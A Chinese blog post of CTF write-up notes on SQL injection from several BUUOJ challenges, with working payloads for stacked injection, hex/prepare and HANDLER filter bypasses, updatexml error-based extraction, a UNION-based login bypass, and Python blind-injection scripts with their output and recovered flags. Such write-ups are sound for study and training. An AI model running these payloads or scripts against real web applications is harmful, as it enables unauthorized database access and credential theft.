---
title: 记录一下近期刷Buuoj学到的SQL注入技巧
date: 2022-09-21 17:51:00
updated: 2022-09-21 20:45:00
tags: [ctf, security, sql]
description: 一些笔记
---

> 参考了Liki4学长的文章<https://vidar-team.feishu.cn/docx/doxcnlBu6zBZWkzfRcX78hv8DNS>
## 强网杯2019_随便注

这是一道考堆叠注入的题目。

```python
1' order by 2 # 
```

用order by可以测出返回的字段数量为2

但是发现题目过滤了union和select
![图 1](https://s2.loli.net/2022/09/21/3HqpYwIAMWO2xv6.png)  

那么这里可以用堆叠注入，用`;`注入多条语句，用show来查询库名表名列名。

```
?inject=1';show databases;%23

array(1) {
  [0]=>
  string(11) "ctftraining"
}

array(1) {
  [0]=>
  string(18) "information_schema"
}

array(1) {
  [0]=>
  string(5) "mysql"
}

array(1) {
  [0]=>
  string(18) "performance_schema"
}

array(1) {
  [0]=>
  string(9) "supersqli"
}

array(1) {
  [0]=>
  string(4) "test"
}
```

```
?inject=1';show tables;%23

array(1) {
  [0]=>
  string(16) "1919810931114514"
}

array(1) {
  [0]=>
  string(5) "words"
}
```

```
?inject=1';show columns from `1919810931114514`;%23

array(6) {
  [0]=>
  string(4) "flag"
  [1]=>
  string(12) "varchar(100)"
  [2]=>
  string(2) "NO"
  [3]=>
  string(0) ""
  [4]=>
  NULL
  [5]=>
  string(0) ""
}
```

发现flag，但是没法直接查出flag字段的值。

### 思路一

根据对表结构的观察，我们直接输入的变量会从words表中根据id查出对应的值，那么这里可以想办法让flag从`1919810931114514`这个表到words表下，从而查出flag。

不过flag所在的表`1919810931114514`是没有id这个列的，所以我们先将words表rename成其他表，再将`1919810931114514`表改名为words并且添加列名id,再将flag这个列名改为data。

alter
作用：修改已知表的列。（ 添加：add | 修改：alter，change | 撤销：drop ）

用法：
```
添加一个列
alter table " table_name" add " column_name"  type;

删除一个列
alter table " table_name" drop " column_name"  type;

改变列的数据类型
alter table " table_name" alter column " column_name" type;

改列名
alter table " table_name" change " column1" " column2" type;

alter table "table_name" rename "column1" to "column2";
```

```
1'; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);%23

array(2) {
  [0]=>
  string(42) "flag{1957d8cb-e9c3-43a2-8535-baf3a012a9ba}"
  [1]=>
  string(1) "1"
}
```

### 思路二

用16进制编码绕过select的过滤查询flag字段的值。

将select * from ` 1919810931114514 `进行16进制编码，再通过构造payload得

```
1'SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;%23
```

理语句，会进行编码转换。
execute用来执行由SQLPrepare创建的SQL语句。
SELECT可以在一条语句里对多个变量同时赋值,而SET只能一次对一个变量赋值。

### 思路三

用handler替换select来进行查询。

mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。

```
HANDLER tbl_name OPEN [ [AS] alias]
 
HANDLER tbl_name READ index_name { = | <= | >= | < | > } (value1,value2,...)
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ index_name { FIRST | NEXT | PREV | LAST }
    [ WHERE where_condition ] [LIMIT ... ]
HANDLER tbl_name READ { FIRST | NEXT }
    [ WHERE where_condition ] [LIMIT ... ]
 
HANDLER tbl_name CLOSE
```

```
?inject=1'; handler `1919810931114514` open as `a`; handler `a` read next;%23

array(1) {
  [0]=>
  string(42) "flag{3d656713-cae4-496d-a8fc-e197d81e8661}"
}
```

## SUSCTF2019_EasySQL

> 参考文章<https://www.cnblogs.com/gtx690/p/13176458.html>

首先也是先用字典`<https://github.com/TheKingOfDuck/fuzzDicts/blob/master/sqlDict/sql.txt`>fuzz一下过滤情况，然后发现报错注入和盲注一些常见的函数都被过滤了，这里可以考虑用堆叠注入，并且select并没有被过滤。

```
1;show databases;

1;show tables;

1;show columns from Flag;
```

诶但是flag被过滤了，因此这里不能看Flag的表结构了。

### 思路一

这是官方的wp中的思路，这里的sql语句为`select $post['query']||flag from Flag`。

```
1;set sql_mode=PIPES_AS_CONCAT;select 1
```

其中set sql_mode=PIPES_AS_CONCAT;的作用是将||的功能从 或运算（or） 改为  字符串拼接，从而将select1和select flag from Flag的结果拼接在一起。

### 思路二

如果$post[‘query’]的数据为*,1，sql语句就变成了select*,1||flag from Flag，也就是select *,1 from Flag，也就是直接查询出了Flag表中的所有内容

但是这里两种思路都是需要能够猜到查询语句的，所以感觉还是比较难的题目，做的时候很难想到。

## 极客大挑战2019_HardSQL

> 参考文章<https://xz.aliyun.com/t/253>

这个题目主要考察的是报错注入，原因是这是一个有回显的SQL注入情形但是Union注入的常见函数都被过滤了，而且有报错信息且报错注入的函数比如`updatexml`可以用。

那首先报错注入的主要原理是利用报错信息的输出，简单说几个报错注入的常见用法。

- BigInt等数据类型溢出
  整形溢出比较受mysql版本限制，不太好用
- xpath语法错误
  Mysql5.1.5之后提供了两个XML查询和修改的函数，extractvalue和updatexml。extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml负责修改查询到的内容。这两个函数的第二个参数如果不满足xpath语法，都会将查询结果放在报错信息中，那么就可以借此输出查询结果。
- count()+rand()+group_by()导致主键重复。
  这种报错方法的本质是因为floor(rand(0)*2)的重复性，floor(rand(0)*2)则会固定得到011011...的序列。group by key的原理是循环读取数据的每一行，将结果保存于临时表中。而当临时表的结果中某个字段为主键时，重复的序列会导致报错。

题目中可以用updatexml来进行报错注入，并且对于`空格,=`等过滤，使用`()`和`like`来进行绕过。
```
admin'^updatexml(1,concat(0x7e,(select(database())),0x7e),1)#

admin'^updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like('geek'))),0x7e),1)#

admin'^updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1'))),0x7e),1)#

admin'^updatexml(1,concat(0x7e,(select(left(password,30))from(H4rDsq1)),0x7e),1)#

admin'^updatexml(1,concat(0x7e,(select(right(password,30))from(H4rDsq1)),0x7e),1)#
```
最后这里查flag内容的时候，由于 updtexml最多显示32的长度，导致flag显示不全。然后用substr截取一下，发现substr被过滤了，于是上网找了另一种操作，用left和right截取函数分两次把完整的flag查出来了。

## 极客大挑战2019_FinalSQL

在get传id参数的位置存在注入点,考察的是盲注。

```
/search.php?id=1-1
```
回显error说明传入的参数为数字型。

这里可以利用-来做逻辑运算，如果后面部分表达式的值为1时会回显error,否则为not this。

```
/search.php?id=1-(length(database())=4)
```

手动测一下，发现数据库库名长度为4，接下来的内容就要上脚本了。

```
import requests as req
import time

url = "http://dd90e537-68a9-4b2f-8bf5-17d60186d512.node4.buuoj.cn:81/search.php?id="
res = ''
length = 1000
for i in range(1,length+1):
    low = 0x00
    high = 0x7f
    while(low <= high):
        mid = (high + low) // 2
        print(low, mid, high)
        # payload = f"1-(length(database())>{{mid}})"
        # payload = f"1-(ascii(substr((database()),{i},1))>{mid})"
        # payload = f"1-(ascii(substr((Select(group_concat(table_name))From(information_schema.tables)Where(table_schema='geek')),{i},1))>{mid})"
        # payload = f"1-(ascii(substr((Select(group_concat(column_name))From(information_schema.columns)Where(table_name='F1naI1y')),{i},1))>{mid})"
        # payload = f"1 and ascii(substr(reverse((Select password From fl4gawsl Where id=2)), {i}, 1)) > {mid}"
        payload = f"1-(ascii(substr((Select(group_concat(id,username,password))From(F1naI1y)),{i},1))>{mid})"
        print(payload)
        response = req.get(url + payload)
        print(len(response.text))
        ## 二分法条件
        if(len(response.text) < 723):
            low = mid + 1
        else:
            high = mid - 1
        time.sleep(0.5)
        # print("[+]:", res)
    res += chr(low)
    print("[+]:", res)
print(res)
```

```
[+]: geek
[+]: F1naI1y,Flaaaaag
[+]: id,username,password
[+]: 9flagflag{7a4aa96d-eae0-493a-9fc7-a1d7bae8ebfa}
```

## BUU SQL COURSE 1

很简单的sql注入题目，不过我发现Mysql版本<=5.0,没有`information_schema.schemata`这个表，所以习惯性用这个表里面找schema_name,一下子没找出来没，直接databse()就行。

## GXYCTF2019_BabySQli
有回显但是只会返回查询结果的对错并且有报错信息，盲注和报错注入都可以考虑。

使用order by测试返回字段数时被过滤用Or绕过。
```
name=123'Order by 3%23&pw=123
```
发现返回字段数为3

发现括号被过滤了那updatexml什么的函数就用不了了吧。

那么先试试盲注吧

不过这里盲注出来的话会发现password是个md5值，然后这就很难受了。

题目源码如下

```php
<?php
 $name = $_POST['name'];
 $password = $_POST['pw'];
 # 对传入的密码 md5
 $t_pw = md5($password);
 $sql = "select * from user where username = '".$name."'";
 // echo $sql;
 $result = mysqli_query($con, $sql);
 # 过滤括号、=、or
 if(preg_match("/\(|\)|\=|or/", $name)){
  die("do not hack me!");
 }
 else{
  if (!$result) {
   printf("Error: %s\n", mysqli_error($con));
   exit();
  }
  else{
   // echo '<pre>';
      # 获取单行结果
   $arr = mysqli_fetch_row($result);
   // print_r($arr);
      # 第二个元素是username
   if($arr[1] == "admin"){
         # 第三个元素是passwd
    if(md5($password) == $arr[2]){
     echo $flag;
    }
    else{
           # 密码错了、用户名对了
     die("wrong pass!");
    }
   }
   else{
         # 无此用户
    die("wrong user!");
   }
  }
 }
```

正确的做法是利用联合查询的特性,联合查询不存在的数据时，会构造一个虚拟的数据，那么这里我们给username为admin的用户插入一个密码就可以登陆admin用户了。

输入1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#（202cb962ac59075b964b07152d234b70为123的md5加密值，此题由于过滤了括号，所以不能用md5()函数）。在密码处输入我们自定义的密码123，即可绕过检验，成功登陆admin账户。

## NCTF2019_SQLi

/hint.txt有过滤内容，拿到admin密码登陆就可以get flag。

```
$black_list = "/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|<|>|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i";
```

单引号被过滤了无法闭合引号，但是我们这里可以用反斜杠来转义引号。

username字段为`\`时，select * from users where username='\' and passwd='{passwd}'，用户名为`' and passwd='`，而我们可以用`%00`来截断最后一个引号，再使用逻辑运算符和regexp来对passwd字段的。

```
import requests
from urllib import parse
import string

url = 'http://6bfe4eb0-dec7-4e5d-b866-185f3f2bfd31.node4.buuoj.cn:81/'
num = 0
result = ''
string= string.ascii_lowercase + string.digits + '_'
for i in range (1,60):
    if num == 1 :
        break
    for j in string:
        data = {
            "username":"\\",
            "passwd":"||/**/passwd/**/regexp/**/\"^{}\";{}".format((result+j),parse.unquote('%00'))
        }
        print(result+j)
        res = requests.post(url=url,data=data)
        if 'welcome' in res.text:
            result += j
            break
        if j=='_' and 'welcome' not in res.text:
            break
```
